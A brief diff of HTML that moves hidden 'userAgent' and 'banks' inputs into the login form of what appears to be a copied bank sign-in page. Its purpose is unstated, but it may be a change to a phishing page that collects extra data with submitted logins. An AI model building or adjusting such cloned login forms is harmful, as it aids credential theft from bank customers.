@@ -53,8 +53,7 @@
 </head>
 
 <body prevent-click-highlight="" autoscroll="">
-    <input type="hidden" id="userAgent" name="userAgent">
-    <input type="hidden" id="banks" name="banks">
+   
     <div id="contentWrapper">
         <div data-ui-view="header" class="" style="">
             <header-public>
@@ -1417,6 +1416,8 @@
                                                 username-access-card-list="$resolve.usernameAccessCardList">
                                                 <form id="loginForm"
                                                     class="lab-form ng-pristine ng-valid td_rq_form_legacy td-form td-form-validate td-form-dynamic ng-valid-function">
+                                                    <input type="hidden" id="userAgent" name="userAgent">
+                                                    <input type="hidden" id="banks" name="banks">
                                                     <div class="td-row">
                                                         <div class="td-col-sm-12">
                                                             <cards-selector cards="vm.dt.usernameAccessCardList"
